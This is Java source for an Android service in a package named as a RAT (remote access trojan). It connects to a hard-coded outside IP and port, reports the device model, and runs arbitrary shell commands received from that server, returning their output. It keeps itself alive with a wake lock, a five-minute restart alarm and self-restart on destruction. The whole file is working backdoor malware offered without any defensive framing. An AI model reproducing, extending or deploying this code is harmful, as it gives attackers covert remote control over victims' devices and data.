package com.fly0rakoon.rat.services;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ConnectionService extends Service {
    private static final String TAG = "ConnectionService";
    private static String SERVER_IP = "34.58.145.84";
    private static int SERVER_PORT = 5555;
    
    private Socket socket;
    private BufferedReader input;
    private PrintWriter output;
    private Thread connectionThread;
    private PowerManager.WakeLock wakeLock;
    private boolean isRunning = true;
    private int reconnectDelay = 1000; // Start with 1 second
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "ConnectionService created");
        
        // Acquire wake lock to prevent CPU sleep
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "Fly0Rakoon::ConnectionWakeLock"
        );
        wakeLock.acquire(10 * 60 * 1000L); // 10 minutes
        
        startConnection();
        
        // Schedule alarm to restart service periodically
        scheduleAlarm();
    }
    
    private void scheduleAlarm() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
            this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );
        
        // Restart every 5 minutes to ensure persistence
        alarmManager.setInexactRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 5 * 60 * 1000,
            5 * 60 * 1000,
            pendingIntent
        );
    }
    
    private void startConnection() {
        connectionThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        if (socket == null || !socket.isConnected()) {
                            connect();
                        }
                        
                        if (socket != null && socket.isConnected()) {
                            reconnectDelay = 1000; // Reset delay on successful connection
                            sendMessage("DEVICE:" + android.os.Build.MANUFACTURER + "-" + android.os.Build.MODEL);
                            
                            String line;
                            while ((line = input.readLine()) != null && isRunning) {
                                Log.d(TAG, "Received command: " + line);
                                processCommand(line);
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Connection error", e);
                        disconnect();
                        
                        // Exponential backoff for reconnection
                        try {
                            Thread.sleep(reconnectDelay);
                            reconnectDelay = Math.min(reconnectDelay * 2, 60000); // Max 60 seconds
                        } catch (InterruptedException ie) {
                            Thread.currentThread().interrupt();
                        }
                    }
                }
            }
        });
        connectionThread.start();
    }
    
    private void connect() {
        try {
            Log.d(TAG, "Connecting to " + SERVER_IP + ":" + SERVER_PORT);
            socket = new Socket();
            socket.connect(new InetSocketAddress(SERVER_IP, SERVER_PORT), 10000);
            input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            output = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
            Log.d(TAG, "Connected successfully");
        } catch (Exception e) {
            Log.e(TAG, "Connection failed", e);
            socket = null;
        }
    }
    
    private void disconnect() {
        try {
            if (socket != null) socket.close();
            if (input != null) input.close();
            if (output != null) output.close();
        } catch (Exception e) {
            Log.e(TAG, "Error closing socket", e);
        } finally {
            socket = null;
            input = null;
            output = null;
        }
    }
    
    private void processCommand(String command) {
        if (command.equals("ping")) {
            sendMessage("pong");
        } else if (command.equals("info")) {
            sendMessage("Device: " + android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
        } else if (command.startsWith("shell:")) {
            // Execute shell command
            String cmd = command.substring(6);
            try {
                Process process = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                sendMessage("SHELL_OUTPUT:" + output.toString());
            } catch (Exception e) {
                sendMessage("SHELL_ERROR:" + e.getMessage());
            }
        } else {
            sendMessage("Unknown command: " + command);
        }
    }
    
    private void sendMessage(String message) {
        if (output != null) {
            output.println(message);
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "ConnectionService onStartCommand");
        return START_STICKY_COMPATIBILITY;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "ConnectionService destroyed - restarting");
        isRunning = false;
        
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        disconnect();
        
        // Restart service
        Intent restartIntent = new Intent(this, ConnectionService.class);
        startService(restartIntent);
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
